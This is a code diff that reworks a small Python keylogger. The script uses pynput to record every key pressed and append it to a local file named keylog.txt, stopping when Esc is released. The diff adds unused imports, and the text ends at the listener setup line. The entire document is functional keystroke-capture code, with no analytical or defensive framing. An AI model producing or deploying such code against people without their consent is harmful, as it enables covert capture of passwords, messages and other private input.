@@ -1,41 +1,23 @@
 import os
+import sys
+import time
 from pynput import keyboard
 
-# File path and name
-file_path = 'keystrokes.txt'
+# File to write keystrokes
+file = 'keylog.txt'
 
 def on_press(key):
     try:
-        with open(file_path, 'a') as f:
-            f.write('[{}]'.format(key.char))
-    except AttributeError:
-        if key == keyboard.Key.esc:
-            return False
-        elif key == keyboard.Key.space:
-            with open(file_path, 'a') as f:
-                f.write('[SPACE]')
-        else:
-            with open(file_path, 'a') as f:
-                f.write('[{}]'.format(key))
-    except Exception as e:
-        print("Error occurred while writing to file:", str(e))
+        k = key.char
+    except:
+        k = str(key)
+    with open(file, 'a') as f:
+        f.write(k)
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        # Stop listener
         return False
-    else:
-        try:
-            with open(file_path, 'a') as f:
-                f.write('[{}]'.format(key.char))
-        except AttributeError:
-            if key == keyboard.Key.space:
-                with open(file_path, 'a') as f:
-                    f.write('[SPACE]')
-            else:
-                with open(file_path, 'a') as f:
-                    f.write('[{}]'.format(key))
-        except Exception as e:
-            print("Error occurred while writing to file:", str(e))
 
 # Collect events until released
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
